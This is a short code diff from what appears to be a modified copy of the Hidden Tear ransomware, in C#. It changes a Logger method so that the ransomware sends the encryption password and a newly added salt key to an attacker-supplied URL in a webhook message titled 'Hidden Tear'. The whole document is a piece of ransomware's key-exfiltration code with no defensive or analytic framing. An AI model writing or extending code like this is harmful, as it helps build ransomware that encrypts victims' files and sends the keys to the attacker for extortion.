@@ -9,7 +9,7 @@ namespace hidden_tear.Tools
 {
     internal class Logger
     {
-        public static async Task SendPassword(string url,string password)
+        public static async Task SendData(string url,string password,string salt)
         {
             var payload = new
             {
@@ -21,7 +21,7 @@ namespace hidden_tear.Tools
                     new
                     {
                         title = $"Hidden Tear",
-                        description = $"password: {password}",
+                        description = $"password: {password}\nsalt key: {salt}",
                         color = 16711680
                     }
                 }
